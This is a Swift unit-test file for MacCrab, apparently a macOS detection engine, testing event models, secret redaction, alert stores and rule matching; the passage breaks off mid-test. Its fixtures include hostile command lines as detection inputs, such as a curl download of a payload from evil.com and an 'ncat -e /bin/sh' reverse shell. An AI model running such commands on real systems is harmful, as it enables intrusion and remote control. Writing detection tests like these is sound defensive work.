// MacCrabCoreTests.swift
// Comprehensive tests for MacCrab detection engine core components.

import Testing
import Foundation
@testable import MacCrabCore

// Type aliases for nested types
typealias BLConfig = BaselineEngine.Config
typealias BLState = BaselineEngine.BaselineState
typealias PEdge = BaselineEngine.ProcessEdge

// MARK: - Test Helpers

/// Create a minimal test event with sensible defaults.
func makeEvent(
    category: EventCategory = .process,
    type: EventType = .creation,
    action: String = "exec",
    processName: String = "test",
    processPath: String = "/usr/bin/test",
    commandLine: String = "/usr/bin/test",
    pid: Int32 = 100,
    ppid: Int32 = 1,
    parentPath: String = "/sbin/launchd",
    file: FileInfo? = nil,
    network: NetworkInfo? = nil,
    tcc: TCCInfo? = nil
) -> Event {
    let process = ProcessInfo(
        pid: pid,
        ppid: ppid,
        rpid: ppid,
        name: processName,
        executable: processPath,
        commandLine: commandLine,
        args: commandLine.split(separator: " ").map(String.init),
        workingDirectory: "/",
        userId: 501,
        userName: "testuser",
        groupId: 20,
        startTime: Date(),
        exitCode: nil,
        codeSignature: nil,
        ancestors: [ProcessAncestor(pid: ppid, executable: parentPath, name: URL(fileURLWithPath: parentPath).lastPathComponent)],
        architecture: "arm64",
        isPlatformBinary: false
    )
    return Event(
        eventCategory: category,
        eventType: type,
        eventAction: action,
        process: process,
        file: file,
        network: network,
        tcc: tcc
    )
}

func makeAlert(
    ruleId: String = "test-rule-001",
    ruleTitle: String = "Test Rule",
    severity: Severity = .high,
    processName: String = "curl"
) -> Alert {
    Alert(
        ruleId: ruleId,
        ruleTitle: ruleTitle,
        severity: severity,
        eventId: UUID().uuidString,
        processPath: "/usr/bin/\(processName)",
        processName: processName,
        description: "Test alert",
        mitreTactics: "attack.execution",
        mitreTechniques: "attack.t1059.004",
        suppressed: false
    )
}

// MARK: - Event Model Tests

@Suite("Event Model")
struct EventModelTests {

    @Test("Event has UUID and timestamp by default")
    func eventDefaults() {
        let event = makeEvent()
        #expect(!event.id.uuidString.isEmpty)
        #expect(event.timestamp.timeIntervalSinceNow < 1)
        #expect(event.eventCategory == .process)
    }

    @Test("Event categories are CaseIterable and Codable")
    func eventCategoryCodable() throws {
        for category in EventCategory.allCases {
            let data = try JSONEncoder().encode(category)
            let decoded = try JSONDecoder().decode(EventCategory.self, from: data)
            #expect(category == decoded)
        }
    }

    @Test("Severity is Comparable")
    func severityOrdering() {
        #expect(Severity.informational < Severity.low)
        #expect(Severity.low < Severity.medium)
        #expect(Severity.medium < Severity.high)
        #expect(Severity.high < Severity.critical)
        #expect(!(Severity.critical < Severity.informational))
    }

    @Test("Severity has 5 cases")
    func severityCount() {
        #expect(Severity.allCases.count == 5)
    }

    @Test("SignerType roundtrips through JSON")
    func signerTypeCodable() throws {
        for signer in SignerType.allCases {
            let data = try JSONEncoder().encode(signer)
            let decoded = try JSONDecoder().decode(SignerType.self, from: data)
            #expect(signer == decoded)
        }
    }

    @Test("FileAction roundtrips through JSON")
    func fileActionCodable() throws {
        for action in FileAction.allCases {
            let data = try JSONEncoder().encode(action)
            let decoded = try JSONDecoder().decode(FileAction.self, from: data)
            #expect(action == decoded)
        }
    }

    @Test("Event with all sub-objects roundtrips through JSON")
    func fullEventCodable() throws {
        let file = FileInfo(path: "/tmp/malware.bin", action: .create)
        let net = NetworkInfo(
            sourceIp: "192.168.1.100", sourcePort: 54321,
            destinationIp: "8.8.8.8", destinationPort: 443,
            direction: .outbound, transport: "tcp"
        )
        let tcc = TCCInfo(
            service: "kTCCServiceCamera",
            client: "com.evil.app",
            clientPath: "/Applications/Evil.app",
            allowed: true,
            authReason: "user_consent"
        )
        let event = makeEvent(file: file, network: net, tcc: tcc)

        let data = try JSONEncoder().encode(event)
        let decoded = try JSONDecoder().decode(Event.self, from: data)

        #expect(decoded.id == event.id)
        #expect(decoded.file?.path == "/tmp/malware.bin")
        #expect(decoded.network?.destinationPort == 443)
        #expect(decoded.tcc?.service == "kTCCServiceCamera")
    }
}

// MARK: - NetworkInfo Tests

@Suite("NetworkInfo")
struct NetworkInfoTests {

    @Test("RFC 1918 private addresses detected", arguments: [
        "10.0.0.1", "10.255.255.255",
        "172.16.0.1", "172.31.255.255",
        "192.168.0.1", "192.168.255.255",
        "127.0.0.1", "127.255.255.255",
    ])
    func privateAddresses(ip: String) {
        let net = NetworkInfo(
            sourceIp: "0.0.0.0", sourcePort: 0,
            destinationIp: ip, destinationPort: 80,
            direction: .outbound, transport: "tcp"
        )
        #expect(net.destinationIsPrivate, "Expected \(ip) to be private")
    }

    @Test("Public addresses not flagged as private", arguments: [
        "8.8.8.8", "1.1.1.1", "203.0.113.1", "172.32.0.1", "172.15.255.255",
    ])
    func publicAddresses(ip: String) {
        let net = NetworkInfo(
            sourceIp: "0.0.0.0", sourcePort: 0,
            destinationIp: ip, destinationPort: 80,
            direction: .outbound, transport: "tcp"
        )
        #expect(!net.destinationIsPrivate, "Expected \(ip) to be public")
    }

    @Test("IPv6 loopback and ULA detected as private")
    func ipv6Private() {
        let loopback = NetworkInfo(
            sourceIp: "::", sourcePort: 0,
            destinationIp: "::1", destinationPort: 80,
            direction: .outbound, transport: "tcp"
        )
        #expect(loopback.destinationIsPrivate)

        let ula = NetworkInfo(
            sourceIp: "::", sourcePort: 0,
            destinationIp: "fd12:3456:789a::1", destinationPort: 80,
            direction: .outbound, transport: "tcp"
        )
        #expect(ula.destinationIsPrivate)
    }

    @Test("NetworkInfo roundtrips through JSON")
    func codable() throws {
        let net = NetworkInfo(
            sourceIp: "192.168.1.5", sourcePort: 12345,
            destinationIp: "93.184.216.34", destinationPort: 443,
            destinationHostname: "example.com",
            direction: .outbound, transport: "tcp"
        )
        let data = try JSONEncoder().encode(net)
        let decoded = try JSONDecoder().decode(NetworkInfo.self, from: data)
        #expect(decoded.destinationHostname == "example.com")
        #expect(decoded.sourcePort == 12345)
    }
}

// MARK: - FileInfo Tests

@Suite("FileInfo")
struct FileInfoTests {

    @Test("Convenience init derives name, directory, extension from path")
    func convenienceInit() {
        let info = FileInfo(path: "/Users/test/Documents/report.pdf", action: .create)
        #expect(info.name == "report.pdf")
        #expect(info.directory == "/Users/test/Documents")
        #expect(info.extension_ == "pdf")
    }

    @Test("FileInfo with no extension")
    func noExtension() {
        let info = FileInfo(path: "/usr/bin/curl", action: .create)
        #expect(info.name == "curl")
        #expect(info.extension_ == nil || info.extension_ == "")
    }
}

// MARK: - Alert Model Tests

@Suite("Alert Model")
struct AlertModelTests {

    @Test("Alert roundtrips through JSON")
    func alertCodable() throws {
        let alert = makeAlert()
        let data = try JSONEncoder().encode(alert)
        let decoded = try JSONDecoder().decode(Alert.self, from: data)
        #expect(decoded.id == alert.id)
        #expect(decoded.severity == .high)
        #expect(decoded.ruleTitle == "Test Rule")
        #expect(decoded.mitreTechniques == "attack.t1059.004")
    }

    @Test("Alert has auto-generated UUID")
    func alertAutoId() {
        let a1 = makeAlert()
        let a2 = makeAlert()
        #expect(a1.id != a2.id)
    }
}

// MARK: - CommandSanitizer Tests

@Suite("CommandSanitizer")
struct CommandSanitizerTests {

    @Test("Redacts MySQL -p password forms")
    func mysqlPasswords() {
        #expect(CommandSanitizer.sanitize("mysql -p'secret123'") .contains("[REDACTED]"))
        #expect(CommandSanitizer.sanitize(#"mysql -p"secret123""#).contains("[REDACTED]"))
        #expect(CommandSanitizer.sanitize("mysql -pS3cret!").contains("[REDACTED]"))
    }

    @Test("Redacts --password=value and --token=value")
    func longFlags() {
        let result = CommandSanitizer.sanitize("curl --password=hunter2 --token=abc123def456")
        #expect(result.contains("--password=[REDACTED]"))
        #expect(result.contains("--token=[REDACTED]"))
        #expect(!result.contains("hunter2"))
    }

    @Test("Redacts --password value (space-separated)")
    func longFlagsSpace() {
        let result = CommandSanitizer.sanitize("ssh --password mysecret host")
        #expect(result.contains("--password [REDACTED]"))
        #expect(!result.contains("mysecret"))
    }

    @Test("Redacts URL credentials")
    func urlCredentials() {
        let result = CommandSanitizer.sanitize("curl https://user:p4ssw0rd@example.com/api")
        #expect(result.contains("[REDACTED]"))
        #expect(!result.contains("p4ssw0rd"))
        #expect(result.contains("example.com"))
    }

    @Test("Redacts AWS access key IDs")
    func awsKeys() {
        let result = CommandSanitizer.sanitize("aws s3 ls AKIAIOSFODNN7EXAMPLE")
        #expect(result.contains("[REDACTED_AWS_KEY]"))
        #expect(!result.contains("AKIAIOSFODNN7EXAMPLE"))
    }

    @Test("Redacts GitHub tokens")
    func githubTokens() {
        let token = "ghp_ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmn"
        let result = CommandSanitizer.sanitize("git clone https://\(token)@github.com/repo")
        #expect(result.contains("[REDACTED_GH_TOKEN]"))
    }

    @Test("Redacts Bearer tokens")
    func bearerTokens() {
        let result = CommandSanitizer.sanitize("curl -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiJ9.payload.sig'")
        #expect(result.contains("Bearer [REDACTED]"))
    }

    @Test("Redacts generic KEY=VALUE secrets")
    func genericKeyValue() {
        let result = CommandSanitizer.sanitize("API_KEY=sk_live_12345678abcdef ./run.sh")
        #expect(result.contains("[REDACTED]"))
        #expect(!result.contains("sk_live_12345678abcdef"))
    }

    @Test("Preserves non-sensitive content")
    func preservesSafe() {
        let cmd = "ls -la /usr/bin"
        #expect(CommandSanitizer.sanitize(cmd) == cmd)
    }
}

// MARK: - ProcessLineage Tests

@Suite("ProcessLineage")
struct ProcessLineageTests {

    @Test("Records and retrieves parent-child relationships")
    func basicLineage() async {
        let lineage = ProcessLineage()
        await lineage.recordProcess(pid: 1, ppid: 0, path: "/sbin/launchd", name: "launchd", startTime: Date())
        await lineage.recordProcess(pid: 100, ppid: 1, path: "/bin/bash", name: "bash", startTime: Date())
        await lineage.recordProcess(pid: 200, ppid: 100, path: "/usr/bin/curl", name: "curl", startTime: Date())

        let ancestors = await lineage.ancestors(of: 200)
        #expect(ancestors.count >= 2)
        #expect(ancestors.contains { $0.name == "bash" })
        #expect(ancestors.contains { $0.name == "launchd" })
    }

    @Test("isDescendant works")
    func descendantCheck() async {
        let lineage = ProcessLineage()
        await lineage.recordProcess(pid: 1, ppid: 0, path: "/sbin/launchd", name: "launchd", startTime: Date())
        await lineage.recordProcess(pid: 50, ppid: 1, path: "/bin/zsh", name: "zsh", startTime: Date())
        await lineage.recordProcess(pid: 51, ppid: 50, path: "/usr/bin/grep", name: "grep", startTime: Date())

        #expect(await lineage.isDescendant(51, of: 1))
        #expect(await lineage.isDescendant(51, of: 50))
        #expect(await !lineage.isDescendant(1, of: 51))
    }

    @Test("children returns direct child PIDs")
    func childrenLookup() async {
        let lineage = ProcessLineage()
        await lineage.recordProcess(pid: 1, ppid: 0, path: "/sbin/launchd", name: "launchd", startTime: Date())
        await lineage.recordProcess(pid: 10, ppid: 1, path: "/a", name: "a", startTime: Date())
        await lineage.recordProcess(pid: 11, ppid: 1, path: "/b", name: "b", startTime: Date())
        await lineage.recordProcess(pid: 20, ppid: 10, path: "/c", name: "c", startTime: Date())

        let kids = await lineage.children(of: 1)
        #expect(kids.count == 2)
        #expect(kids.contains(10))
        #expect(kids.contains(11))
    }

    @Test("recordExit and prune remove stale processes")
    func pruning() async {
        let lineage = ProcessLineage(retentionWindow: 0.1)
        await lineage.recordProcess(pid: 99, ppid: 1, path: "/tmp/old", name: "old", startTime: Date())
        await lineage.recordExit(pid: 99)
        // Wait for retention to expire
        try? await Task.sleep(nanoseconds: 200_000_000)
        await lineage.prune()
        #expect(await !lineage.contains(pid: 99))
    }
}

// MARK: - AlertDeduplicator Tests

@Suite("AlertDeduplicator")
struct AlertDeduplicatorTests {

    @Test("First alert is not suppressed, duplicate within window is suppressed")
    func basicDedup() async {
        let dedup = AlertDeduplicator(suppressionWindow: 60)
        let suppressed1 = await dedup.shouldSuppress(ruleId: "r1", processPath: "/usr/bin/curl")
        #expect(!suppressed1)
        await dedup.recordAlert(ruleId: "r1", processPath: "/usr/bin/curl")

        let suppressed2 = await dedup.shouldSuppress(ruleId: "r1", processPath: "/usr/bin/curl")
        #expect(suppressed2)
    }

    @Test("Different rule+process combos are not suppressed")
    func differentKeys() async {
        let dedup = AlertDeduplicator(suppressionWindow: 60)
        await dedup.recordAlert(ruleId: "r1", processPath: "/usr/bin/curl")

        let suppressed = await dedup.shouldSuppress(ruleId: "r1", processPath: "/usr/bin/wget")
        #expect(!suppressed)

        let suppressed2 = await dedup.shouldSuppress(ruleId: "r2", processPath: "/usr/bin/curl")
        #expect(!suppressed2)
    }

    @Test("Suppression expires after window")
    func expiry() async {
        let dedup = AlertDeduplicator(suppressionWindow: 0.1)
        await dedup.recordAlert(ruleId: "r1", processPath: "/usr/bin/curl")
        try? await Task.sleep(nanoseconds: 200_000_000)
        await dedup.sweep()
        let suppressed = await dedup.shouldSuppress(ruleId: "r1", processPath: "/usr/bin/curl")
        #expect(!suppressed)
    }

    @Test("Stats track suppressions")
    func stats() async {
        let dedup = AlertDeduplicator(suppressionWindow: 60)
        await dedup.recordAlert(ruleId: "r1", processPath: "/p")
        _ = await dedup.shouldSuppress(ruleId: "r1", processPath: "/p")
        let s = await dedup.stats()
        #expect(s.activeSuppressions >= 1)
    }

    @Test("Reset clears all state")
    func reset() async {
        let dedup = AlertDeduplicator(suppressionWindow: 60)
        await dedup.recordAlert(ruleId: "r1", processPath: "/p")
        await dedup.reset()
        let suppressed = await dedup.shouldSuppress(ruleId: "r1", processPath: "/p")
        #expect(!suppressed)
    }
}

// MARK: - EventStore Tests

@Suite("EventStore")
struct EventStoreTests {

    @Test("Insert and retrieve events")
    func insertAndRetrieve() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try EventStore(directory: tmpDir.path)
        let event = makeEvent(processName: "curl", processPath: "/usr/bin/curl")
        try await store.insert(event: event)

        let events = try await store.events(since: Date.distantPast, limit: 10)
        #expect(events.count == 1)
        #expect(events[0].process.name == "curl")
    }

    @Test("Count returns correct number")
    func count() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try EventStore(directory: tmpDir.path)
        for i in 0..<5 {
            try await store.insert(event: makeEvent(processName: "p\(i)", pid: Int32(i + 10)))
        }
        let count = try await store.count()
        #expect(count == 5)
    }

    @Test("Batch insert in transaction")
    func batchInsert() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try EventStore(directory: tmpDir.path)
        let events = (0..<20).map { i in
            makeEvent(processName: "batch\(i)", pid: Int32(i + 100))
        }
        try await store.insert(events: events)
        let count = try await store.count()
        #expect(count == 20)
    }

    @Test("Prune removes old events")
    func prune() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try EventStore(directory: tmpDir.path)
        try await store.insert(event: makeEvent(processName: "old"))
        let pruned = try await store.prune(olderThan: Date().addingTimeInterval(1))
        #expect(pruned == 1)
        let count = try await store.count()
        #expect(count == 0)
    }

    @Test("FTS5 search finds matching events")
    func search() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try EventStore(directory: tmpDir.path)
        try await store.insert(event: makeEvent(
            processName: "curl",
            processPath: "/usr/bin/curl",
            commandLine: "curl https://evil.com/payload"
        ))
        try await store.insert(event: makeEvent(
            processName: "ls",
            processPath: "/bin/ls",
            commandLine: "ls -la"
        ))

        let results = try await store.search(text: "evil", limit: 10)
        #expect(results.count == 1)
        #expect(results[0].process.name == "curl")
    }
}

// MARK: - AlertStore Tests

@Suite("AlertStore")
struct AlertStoreTests {

    @Test("Insert and retrieve alerts")
    func insertAndRetrieve() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try AlertStore(directory: tmpDir.path)
        let alert = makeAlert()
        try await store.insert(alert: alert)

        let alerts = try await store.alerts(since: Date.distantPast, limit: 10)
        #expect(alerts.count == 1)
        #expect(alerts[0].ruleTitle == "Test Rule")
    }

    @Test("Severity filtering works")
    func severityFilter() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try AlertStore(directory: tmpDir.path)
        try await store.insert(alert: makeAlert(severity: .low))
        try await store.insert(alert: makeAlert(severity: .high))
        try await store.insert(alert: makeAlert(severity: .critical))

        let highAndAbove = try await store.alerts(since: Date.distantPast, severity: .high, limit: 10)
        #expect(highAndAbove.count >= 2) // high + critical
    }

    @Test("Suppress alert by ID")
    func suppress() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try AlertStore(directory: tmpDir.path)
        let alert = makeAlert()
        try await store.insert(alert: alert)
        try await store.suppress(alertId: alert.id)

        let retrieved = try await store.alert(id: alert.id)
        #expect(retrieved?.suppressed == true)
    }

    @Test("Batch insert alerts")
    func batchInsert() async throws {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)
        defer { try? FileManager.default.removeItem(at: tmpDir) }

        let store = try AlertStore(directory: tmpDir.path)
        let alerts = (0..<10).map { i in makeAlert(ruleId: "rule-\(i)") }
        try await store.insert(alerts: alerts)
        let count = try await store.count()
        #expect(count == 10)
    }
}

// MARK: - RuleEngine Tests

@Suite("RuleEngine")
struct RuleEngineTests {

    /// Write a compiled rule JSON to a temp directory and load it.
    private func loadSingleRule(_ rule: CompiledRule) async throws -> RuleEngine {
        let tmpDir = FileManager.default.temporaryDirectory.appendingPathComponent(UUID().uuidString)
        try FileManager.default.createDirectory(at: tmpDir, withIntermediateDirectories: true)

        let data = try JSONEncoder().encode(rule)
        try data.write(to: tmpDir.appendingPathComponent("\(rule.id).json"))

        let engine = RuleEngine()
        _ = try await engine.loadRules(from: tmpDir)
        return engine
    }

    @Test("Loads rules from JSON files")
    func loadRules() async throws {
        let rule = CompiledRule(
            id: "test-001",
            title: "Test Process Rule",
            description: "Detects test process",
            level: .high,
            tags: ["attack.execution"],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let count = await engine.ruleCount
        #expect(count == 1)
    }

    @Test("Rule matches event with matching predicate")
    func ruleMatches() async throws {
        let rule = CompiledRule(
            id: "detect-curl",
            title: "Curl Execution",
            description: "Detects curl",
            level: .medium,
            tags: ["attack.command_and_control"],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(
            category: .process,
            type: .creation,
            action: "exec",
            processName: "curl",
            processPath: "/usr/bin/curl"
        )
        let matches = await engine.evaluate(event)
        #expect(matches.count == 1)
        #expect(matches[0].ruleId == "detect-curl")
    }

    @Test("Rule does not match non-matching event")
    func noMatch() async throws {
        let rule = CompiledRule(
            id: "detect-curl",
            title: "Curl Execution",
            description: "Detects curl",
            level: .medium,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(processName: "ls", processPath: "/bin/ls")
        let matches = await engine.evaluate(event)
        #expect(matches.isEmpty)
    }

    @Test("Negated predicate inverts matching")
    func negatedPredicate() async throws {
        let rule = CompiledRule(
            id: "not-apple",
            title: "Non-Apple Binary",
            description: "Detects processes not in /usr/bin",
            level: .low,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .startswith, values: ["/usr/bin/"], negate: true)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)

        // /tmp/evil should match (not in /usr/bin/)
        let evilEvent = makeEvent(processPath: "/tmp/evil")
        let matches1 = await engine.evaluate(evilEvent)
        #expect(matches1.count == 1)

        // /usr/bin/ls should NOT match (is in /usr/bin/)
        let safeEvent = makeEvent(processPath: "/usr/bin/ls")
        let matches2 = await engine.evaluate(safeEvent)
        #expect(matches2.isEmpty)
    }

    @Test("anyOf condition matches if any predicate matches")
    func anyOfCondition() async throws {
        let rule = CompiledRule(
            id: "any-suspicious",
            title: "Suspicious Tool",
            description: "Detects suspicious tools",
            level: .medium,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/nmap"], negate: false),
                Predicate(field: "Image", modifier: .endswith, values: ["/netcat"], negate: false),
            ],
            condition: .anyOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(processPath: "/usr/bin/nmap")
        let matches = await engine.evaluate(event)
        #expect(matches.count == 1)
    }

    @Test("Disabled rule does not match")
    func disabledRule() async throws {
        let rule = CompiledRule(
            id: "disabled-rule",
            title: "Disabled",
            description: "Should not fire",
            level: .high,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: false
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(processPath: "/usr/bin/curl")
        let matches = await engine.evaluate(event)
        #expect(matches.isEmpty)
    }

    @Test("setEnabled toggles rule state")
    func toggleEnabled() async throws {
        let rule = CompiledRule(
            id: "toggle-me",
            title: "Toggleable",
            description: "Test",
            level: .low,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(processPath: "/usr/bin/curl")

        // Initially enabled — should match
        var matches = await engine.evaluate(event)
        #expect(matches.count == 1)

        // Disable it
        await engine.setEnabled("toggle-me", enabled: false)
        matches = await engine.evaluate(event)
        #expect(matches.isEmpty)

        // Re-enable it
        await engine.setEnabled("toggle-me", enabled: true)
        matches = await engine.evaluate(event)
        #expect(matches.count == 1)
    }

    @Test("Contains modifier matches substring")
    func containsModifier() async throws {
        let rule = CompiledRule(
            id: "contains-test",
            title: "Command Contains",
            description: "Test",
            level: .medium,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "CommandLine", modifier: .contains, values: ["--password"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(commandLine: "mysql --password=secret -h db.local")
        let matches = await engine.evaluate(event)
        #expect(matches.count == 1)
    }

    @Test("Regex modifier matches pattern")
    func regexModifier() async throws {
        let rule = CompiledRule(
            id: "regex-test",
            title: "Regex Match",
            description: "Test",
            level: .high,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                Predicate(field: "CommandLine", modifier: .regex, values: ["curl.*-o.*/tmp/"], negate: false)
            ],
            condition: .allOf,
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)
        let event = makeEvent(commandLine: "curl https://evil.com -o /tmp/payload")
        let matches = await engine.evaluate(event)
        #expect(matches.count == 1)

        let safeEvent = makeEvent(commandLine: "curl https://example.com")
        let noMatches = await engine.evaluate(safeEvent)
        #expect(noMatches.isEmpty)
    }

    // MARK: - Condition Tree Tests

    @Test("Condition tree: AND with NOT filters (e.g., selection and not filter)")
    func conditionTreeAndNot() async throws {
        // Rule: match curl AND NOT connecting to port 443
        let rule = CompiledRule(
            id: "tree-and-not",
            title: "Curl on unusual port",
            description: "Test",
            level: .medium,
            tags: [],
            logsource: LogSource(category: "network_connection", product: "macos"),
            predicates: [
                // [0] selection: process is curl
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false),
                // [1] filter: destination port 443
                Predicate(field: "DestinationPort", modifier: .equals, values: ["443"], negate: false),
            ],
            condition: .allOf, // legacy fallback
            conditionTree: .and([
                .predicate(0),
                .not(.predicate(1)),
            ]),
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)

        // curl on port 8080 — should match (curl AND NOT port 443)
        let net8080 = NetworkInfo(sourceIp: "0.0.0.0", sourcePort: 0, destinationIp: "1.2.3.4", destinationPort: 8080, direction: .outbound, transport: "tcp")
        let event1 = makeEvent(category: .network, type: .connection, action: "connect", processName: "curl", processPath: "/usr/bin/curl", network: net8080)
        let matches1 = await engine.evaluate(event1)
        #expect(matches1.count == 1, "Should match curl on port 8080")

        // curl on port 443 — should NOT match (NOT filter blocks it)
        let net443 = NetworkInfo(sourceIp: "0.0.0.0", sourcePort: 0, destinationIp: "1.2.3.4", destinationPort: 443, direction: .outbound, transport: "tcp")
        let event2 = makeEvent(category: .network, type: .connection, action: "connect", processName: "curl", processPath: "/usr/bin/curl", network: net443)
        let matches2 = await engine.evaluate(event2)
        #expect(matches2.isEmpty, "Should NOT match curl on port 443 (filtered)")

        // wget on port 8080 — should NOT match (not curl)
        let event3 = makeEvent(category: .network, type: .connection, action: "connect", processName: "wget", processPath: "/usr/bin/wget", network: net8080)
        let matches3 = await engine.evaluate(event3)
        #expect(matches3.isEmpty, "Should NOT match wget")
    }

    @Test("Condition tree: OR of AND branches")
    func conditionTreeOrOfAnd() async throws {
        // Rule: (curl AND --insecure) OR (wget AND --no-check)
        let rule = CompiledRule(
            id: "tree-or-and",
            title: "Insecure download",
            description: "Test",
            level: .high,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                // [0] curl
                Predicate(field: "Image", modifier: .endswith, values: ["/curl"], negate: false),
                // [1] --insecure flag
                Predicate(field: "CommandLine", modifier: .contains, values: ["--insecure"], negate: false),
                // [2] wget
                Predicate(field: "Image", modifier: .endswith, values: ["/wget"], negate: false),
                // [3] --no-check flag
                Predicate(field: "CommandLine", modifier: .contains, values: ["--no-check"], negate: false),
            ],
            condition: .anyOf, // legacy fallback
            conditionTree: .or([
                .and([.predicate(0), .predicate(1)]),
                .and([.predicate(2), .predicate(3)]),
            ]),
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)

        // curl --insecure — should match first branch
        let e1 = makeEvent(processName: "curl", processPath: "/usr/bin/curl", commandLine: "curl --insecure https://evil.com")
        #expect(await engine.evaluate(e1).count == 1)

        // wget --no-check — should match second branch
        let e2 = makeEvent(processName: "wget", processPath: "/usr/bin/wget", commandLine: "wget --no-check-certificate https://evil.com")
        #expect(await engine.evaluate(e2).count == 1)

        // curl without --insecure — should NOT match
        let e3 = makeEvent(processName: "curl", processPath: "/usr/bin/curl", commandLine: "curl https://safe.com")
        #expect(await engine.evaluate(e3).isEmpty)

        // wget without --no-check — should NOT match
        let e4 = makeEvent(processName: "wget", processPath: "/usr/bin/wget", commandLine: "wget https://safe.com")
        #expect(await engine.evaluate(e4).isEmpty)
    }

    @Test("Condition tree: (A and B and not C) or D pattern")
    func conditionTreeComplexOrPattern() async throws {
        // Simulates: (selection_process and selection_external and not filter) or ioc
        let rule = CompiledRule(
            id: "tree-complex-or",
            title: "Complex OR pattern",
            description: "Test",
            level: .high,
            tags: [],
            logsource: LogSource(category: "process_creation", product: "macos"),
            predicates: [
                // [0] selection: suspicious process
                Predicate(field: "Image", modifier: .endswith, values: ["/ncat"], negate: false),
                // [1] selection: has network flag
                Predicate(field: "CommandLine", modifier: .contains, values: ["-e"], negate: false),
                // [2] filter: connecting to localhost (benign)
                Predicate(field: "CommandLine", modifier: .contains, values: ["127.0.0.1"], negate: false),
                // [3] ioc: known malicious command
                Predicate(field: "CommandLine", modifier: .contains, values: ["c2.evil.com"], negate: false),
            ],
            condition: .anyOf,
            conditionTree: .or([
                .and([
                    .predicate(0),
                    .predicate(1),
                    .not(.predicate(2)),
                ]),
                .predicate(3),
            ]),
            falsepositives: [],
            enabled: true
        )

        let engine = try await loadSingleRule(rule)

        // ncat -e to external host — matches first branch
        let e1 = makeEvent(processPath: "/usr/bin/ncat", commandLine: "ncat -e /bin/sh 1.2.3.4 4444")
        #expect(await engine.evaluate(e1).count == 1)

        // ncat -e to localhost — filtered out (NOT 127.0.0.1 fails)
        let e2 = makeEvent(processPath: "/usr/bin/ncat", commandLine: "ncat -e /bin/sh 127.0.0.1 4444")
        #expect(await engine.evaluate(e2).isEmpty)

        // Any process mentioning c2.evil.com — matches IOC branch
